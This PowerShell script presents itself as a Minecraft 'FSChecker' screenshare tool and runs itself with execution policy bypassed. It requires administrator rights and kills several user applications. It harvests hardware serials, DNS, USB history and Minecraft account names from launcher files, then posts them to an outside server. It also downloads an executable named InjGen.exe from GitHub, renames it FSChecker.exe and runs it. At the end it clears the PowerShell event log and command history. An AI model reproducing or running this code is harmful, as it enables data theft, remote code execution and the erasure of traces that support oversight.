@'
Clear-Host
$OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = "SilentlyContinue"

function Show-Banner {
    $bannerLines = @(
        "███████╗███████╗ ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ "
        "██╔════╝██╔════╝██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
        "█████╗  ███████╗██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝"
        "██╔══╝  ╚════██║██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗"
        "██║     ███████║╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║"
        "╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    )

    $bannerLines | ForEach-Object -Begin { $i = 0 } -Process {
        $color = @('Cyan', 'Cyan', 'White', 'White', 'Red', 'Red')[$i++]
        Write-Host $_ -ForegroundColor $color
    }

    Write-Host
    Write-Host -ForegroundColor DarkYellow "[+] Developed by Map4yk, Ryodzaki [2025]"
    Write-Host
}

function Get-Signature {
    param ([string]$FilePath)
    if (-not (Test-Path -PathType Leaf -Path $FilePath)) { return "File Was Not Found" }

    switch ((Get-AuthenticodeSignature -FilePath $FilePath).Status) {
        "Valid" { return "Valid Signature" }
        "NotSigned" { return "Invalid Signature (NotSigned)" }
        default { return "Invalid Signature" }
    }
}

Show-Banner

# Проверка прав администратора
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Administrator rights are required for operation." -ForegroundColor Red
    exit 1
}

# Создаём папку под утилиты
$utilsPath = "C:\ss"
if (-not (Test-Path $utilsPath)) { New-Item -ItemType Directory -Path $utilsPath -Force | Out-Null }
Set-Location $utilsPath

# Отключаем процессы, которые могут мешать
Write-Host "[+] Stopping interfering processes..." -ForegroundColor Cyan
$obsProcess = Get-Process -Name "obs64", "obs32", "obs", "ayugram", "telegram", "nvcontainer", "gamebar", "wallpaper32", "wallpaper64", "steam", "lively" -ErrorAction SilentlyContinue
if ($obsProcess) { $obsProcess | Stop-Process -Force -ErrorAction SilentlyContinue }

# Останавливаем службу истории буфера обмена
$clipboardService = Get-Service -Name "*cbdhsvc*" -ErrorAction SilentlyContinue
if ($clipboardService) { Stop-Service -Name $clipboardService.Name -Force -ErrorAction SilentlyContinue }

# Сбор информации о системе
Write-Host "[+] Collecting system information..." -ForegroundColor Cyan
$SystemUser = $env:USERNAME
$SystemName = (Get-CimInstance Win32_OperatingSystem).Caption
$SystemUID = (Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID
$SystemCPU = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name.Trim()
$SystemCPUSerial = (Get-CimInstance Win32_Processor | Select-Object -First 1).ProcessorId.Trim()
$SystemDiskSerial = (Get-Disk | Select-Object -First 1).SerialNumber.Trim()
$SystemBootTime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime.ToString('yyyy-MM-dd HH:mm:ss')
$SystemHWID = $SystemCPUSerial + $SystemDiskSerial

# DNS настройки
$dnsData = @(ipconfig /all | Select-String "DNS" | ForEach-Object { if ($_.ToString() -match "^([^:]+?)\s*:\s*(.*)$" -and $matches[2].Trim()) { $matches[2].Trim() } } | Where-Object { $_ })

# Активные подключения к порту 2556*
$connections = @(netstat -an | Where-Object { $_ -match "TCP.*2556.*ESTABLISHED" } | ForEach-Object { ($_ -split '\s+')[3] -split ':' | Select-Object -First 1 })

# События fsutil.exe с Event ID 501
$usn_deletes = try { 
    Get-WinEvent -FilterXml "<QueryList><Query Id='0' Path='Microsoft-Windows-Ntfs/Operational'><Select Path='Microsoft-Windows-Ntfs/Operational'>*[System[EventID=501]] and *[EventData[Data[@Name='ProcessName'] and (Data='fsutil.exe')]]</Select></Query></QueryList>" -ErrorAction Stop | 
    Sort TimeCreated -Desc | Select -First 1 -ExpandProperty TimeCreated | Get-Date -Format "dd.MM.yyyy HH:mm" 
} catch { "" }

# Процессы javaw.exe и их DLL
$javawDlls = @(Get-Process javaw -ErrorAction SilentlyContinue | ForEach-Object { $_.Modules } | Where-Object { $_.ModuleName -like "*.dll" -and -not $_.FileVersionInfo.FileDescription -and $_.FileName -notmatch "\\(natives|Temp)\\" } | Where-Object { (Get-AuthenticodeSignature $_.FileName).Status -ne 'Valid' } | Select-Object -ExpandProperty FileName)

# Время запуска javaw.exe
$javawStartTime = @(Get-Process javaw -ErrorAction SilentlyContinue | ForEach-Object { $_.StartTime.ToString("dd.MM.yyyy HH:mm") })

# Сбор игровых аккаунтов Minecraft
Write-Host "[+] Collecting Minecraft accounts..." -ForegroundColor Cyan
$mcAlts = @()
@("$env:APPDATA\.minecraft", "$env:APPDATA\.tlauncher\legacy\Minecraft\game") | ForEach-Object { 
    $path = $_; 
    if (Test-Path $path) { 
        @("TlauncherProfiles.json", "tlauncher_profiles.json") | ForEach-Object { 
            $file = Join-Path $path $_; 
            if (Test-Path $file) { 
                try { 
                    $json = Get-Content $file -Raw | ConvertFrom-Json; 
                    if ($_ -eq "TlauncherProfiles.json") { 
                        $mcAlts += $json.accounts.PSObject.Properties.Value.username 
                    } else { 
                        $mcAlts += $json.userSet.list.username 
                    } 
                } catch { } 
            } 
        }
        
        # Поиск в логах
        if (Test-Path "$path\logs") { 
            $cutoffDate = (Get-Date).AddDays(-14); 
            Get-ChildItem "$path\logs" -Recurse -Include *.log, *.log.gz -ErrorAction 0 | Where-Object { $_.LastWriteTime -ge $cutoffDate } | ForEach-Object { 
                try { 
                    $content = if ($_.Extension -eq '.gz') { 
                        $stream = [System.IO.Compression.GzipStream]::new([System.IO.File]::OpenRead($_.FullName), [System.IO.Compression.CompressionMode]::Decompress)
                        $reader = [System.IO.StreamReader]::new($stream)
                        $result = $reader.ReadToEnd()
                        $reader.Close()
                        $result
                    } else { 
                        Get-Content $_.FullName -Raw 
                    }
                    $content | Select-String 'setting user:\s*(.+)$' | ForEach-Object { 
                        $username = $_.Matches[0].Groups[1].Value.Trim()
                        if ($username -match '^[a-zA-Z0-9_]{3,16}$') { $mcAlts += $username }
                    }
                } catch { }
            }
        }
        
        # LabyMod
        @("LabyMod\accounts.json", "labymod-neo\accounts.json") | ForEach-Object { 
            $file = "$path\$_"
            if (Test-Path $file) { 
                try { 
                    $json = Get-Content $file -Raw | ConvertFrom-Json
                    $mcAlts += $json.accounts.PSObject.Properties.Value.username
                } catch { }
            }
        }
        
        # IASX файлы
        if (Test-Path "$path\.iasx") { 
            try { 
                $content = [System.Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes("$path\.iasx"))
                $mcAlts += $content -split '[\0-\x1F\x7F-\x9F]' | Where-Object { 
                    $trimmed = $_.TrimEnd('t')
                    $trimmed -match '^[\p{IsCyrillic}\p{IsBasicLatin}_]{3,20}$' -and $trimmed -notmatch '=$' -and $trimmed -notmatch '(java|alias|user|pass|field|object|count|list|data|xp|sr|lastused|premium|obj|q$|\[)'
                } | ForEach-Object { $_.TrimEnd('t') }
            } catch { }
        }
        
        # Другие IASX файлы
        Get-ChildItem $path -Recurse -Filter *.iasx -ErrorAction 0 | ForEach-Object { 
            try { 
                $content = [System.Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($_.FullName))
                $mcAlts += $content -split '[\0-\x1F\x7F-\x9F]' | Where-Object { 
                    $trimmed = $_.TrimEnd('t')
                    $trimmed -match '^[\p{IsCyrillic}\p{IsBasicLatin}_]{3,20}$' -and $trimmed -notmatch '=$' -and $trimmed -notmatch '(java|alias|user|pass|field|object|count|list|data|xp|sr|lastused|premium|obj|q$|\[)'
                } | ForEach-Object { $_.TrimEnd('t') }
            } catch { }
        }
        
        # accounts_v1 файлы
        Get-ChildItem $path -Recurse -Filter accounts_v1.do_not_send_to_anyone -ErrorAction 0 | ForEach-Object { 
            try { 
                $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                $memoryStream = New-Object System.IO.MemoryStream(, $bytes[2..($bytes.Length - 1)])
                $deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
                $streamReader = New-Object System.IO.StreamReader($deflateStream)
                $content = $streamReader.ReadToEnd()
                $streamReader.Close()
                $deflateStream.Close()
                $memoryStream.Close()
                $mcAlts += $content -split '[\x00-\x1F]' | Where-Object { $_ -match '^[a-zA-Z0-9_]{3,}$' }
            } catch { }
        }
        
        # ias.json файлы
        Get-ChildItem $path -Recurse -Filter ias.json -ErrorAction 0 | ForEach-Object { 
            try { 
                $json = Get-Content $_.FullName -Raw | ConvertFrom-Json
                $mcAlts += $json.accounts.data.username
            } catch { }
        }
    } 
}
$mcAlts = $mcAlts | Where-Object { $_ -and $_.Trim() } | Sort-Object -Unique

# USB данные
Write-Host "[+] Collecting USB data..." -ForegroundColor Cyan
if (-not (Test-Path "USBDriveLog.exe")) { 
    Invoke-WebRequest "http://back.map4yk.ru/static/USBDriveLog.exe" -OutFile "USBDriveLog.exe" 
}
.\USBDriveLog.exe /sjson "USBDriveLog.json" /exit
$usbData = @((Get-Content "USBDriveLog.json" -Raw | ConvertFrom-Json) | Select-Object -ExpandProperty "Unplug Time")
Remove-Item "USBDriveLog.json" -Force

$SenderID = 869828306
$UserName = "fjke35213"

$UserTime = Get-Date -Format "dd.MM.yyyy HH:mm"
$RecycleTime = (Get-ChildItem "C:\`$Recycle.Bin" -Force -Directory | Sort LastWriteTime -Desc | Select -First 1).LastWriteTime.ToString("dd.MM.yyyy HH:mm")
$AnyDeskTime = @("$env:APPDATA\AnyDesk\connection_trace.txt", "C:\ProgramData\AnyDesk\connection_trace.txt") | ForEach-Object { if (Test-Path $_) { (Get-Item $_).LastWriteTime.ToString("dd.MM.yyyy HH:mm") } }

# Отправка данных на сервер
Write-Host "[+] Sending collected data to server..." -ForegroundColor Cyan
$jsonObject = @{
    SenderID = $SenderID
    UserName = $UserName

    System = @{
        SystemName = $SystemName
        SystemUser = $SystemUser
        SystemUID = $SystemUID
        SystemCPU = $SystemCPU
        SystemCPUSerial = $SystemCPUSerial
        SystemDiskSerial = $SystemDiskSerial
        SystemBootTime = $SystemBootTime
        SystemHWID = $SystemHWID
    }

    UserTime = $UserTime
    RecycleTime = $RecycleTime
    AnyDeskTime = $AnyDeskTime
    UsnDeleteTime = $usn_deletes

    DnsData = $dnsData
    Connections = $connections

    JavawStartTime = $javawStartTime
    javawDlls = $javawDlls

    mcAlts = $mcAlts | Where-Object { $_ } | Sort-Object -Unique

    UsbData = $usbData
} | ConvertTo-Json -Depth 10

try {
    $response = Invoke-RestMethod -Uri "http://back.map4yk.ru/dev/upload" -Method Post -Body $jsonObject -ContentType "application/json; charset=utf-8"
    Write-Host "[+] Data sent successfully!" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to send data: $_" -ForegroundColor Red
}

# Скачивание и запуск FSChecker.exe
Write-Host "[+] Downloading and running FSChecker.exe..." -ForegroundColor Cyan
$fsCheckerUrl = "https://raw.githubusercontent.com/koras5880-alt/injgen/refs/heads/main/InjGen.exe"

if (-not (Test-Path "FSChecker.exe")) { 
    Write-Host "[+] Downloading FSChecker.exe from GitHub..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $fsCheckerUrl -OutFile "FSChecker.exe"
}

if (Test-Path "FSChecker.exe") {
    Write-Host "[+] Running FSChecker.exe..." -ForegroundColor Green
    $signature = Get-Signature -FilePath "FSChecker.exe"
    Write-Host "[+] Signature status: $signature" -ForegroundColor DarkYellow
    Start-Process -FilePath ".\FSChecker.exe" -NoNewWindow -Wait
} else {
    Write-Host "[-] Failed to download FSChecker.exe" -ForegroundColor Red
}

# Очистка
Write-Host "[+] Cleaning up..." -ForegroundColor Cyan
wevtutil.exe clear-log "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue
Set-Location "C:\"

# Очистка истории PowerShell
$filePath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $filePath) { Clear-Content -Path $filePath -Force -ErrorAction SilentlyContinue }

Write-Host "[+] Script completed!" -ForegroundColor Green
'@ | Out-File -FilePath "$env:TEMP\FSChecker_temp.ps1" -Encoding UTF8

powershell -ExecutionPolicy Bypass -File "$env:TEMP\FSChecker_temp.ps1"

Remove-Item "$env:TEMP\FSChecker_temp.ps1" -Force
